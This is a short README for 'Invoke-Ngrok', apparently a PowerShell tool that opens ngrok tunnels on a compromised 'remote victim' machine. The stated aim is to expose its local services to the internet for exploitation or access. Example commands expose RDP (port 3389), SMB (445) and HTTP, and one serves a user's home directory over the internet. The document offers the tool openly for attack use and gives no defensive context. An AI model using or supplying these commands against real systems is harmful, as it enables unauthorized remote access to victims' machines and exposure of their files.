# INVOKE-NGROK 
 
Expose local port of a remote victim over Internet. 
Use it to exploit or access local service remotely without public IP (RDP, SQL, SSH, SMB, FTP ...)

Help:
      Parameters: 
		-auth : Your Ngrok API, go to ngrok dashborad to retreive it
		-tcp  : The protocol used by the service you want to expose remotely (tcp/http)
		-port : The port used by the service you want to expose remotely
		-custom : Customie ngrok parameters you want to execute
		-fileserver : Serve local file system over Internet
	example:

	Invoke-Ngrok -auth xxxxxxxxx -protocol tcp -port 3389  # Expose RDP session over Internet 
	Invoke-Ngrok -auth xxxxxxxxx -protocol tcp -port 445   # Expose SMB port over Internet
	Invoke-Ngrok -auth xxxxxxxxx -protocol http -port 80   # Expose HTTP port over Internet
	
	Invoke-Ngrok -auth xxxxxxxxx -fileserver "C:\Users\alan" # Expose local file system directories over internet
	
	Invoke-Ngrok -custom "http -region=us -hostname=dev.example.com 8000"   #Custom ngrok command you want to execute. 
	
Author: @ThebenyGreen
  - EyesOpenSecurity

Credits -  inconshreveable - <alan@ngrok.com> 
